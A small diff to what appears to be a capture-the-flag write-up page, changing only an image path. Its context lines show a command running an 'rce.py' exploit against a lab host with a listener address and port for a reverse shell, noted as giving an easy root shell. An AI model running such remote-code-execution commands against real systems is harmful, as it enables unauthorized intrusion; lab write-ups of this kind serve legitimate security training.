@@ -118,4 +118,4 @@ $ python3 rce.py --ip_address 10.129.2.1 --port 10000 --lhost 10.10.14.13 --lpor
 
 This would give us an easy `root` shell.
 
-<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (12) (1) (3).png" alt=""><figcaption></figcaption></figure>
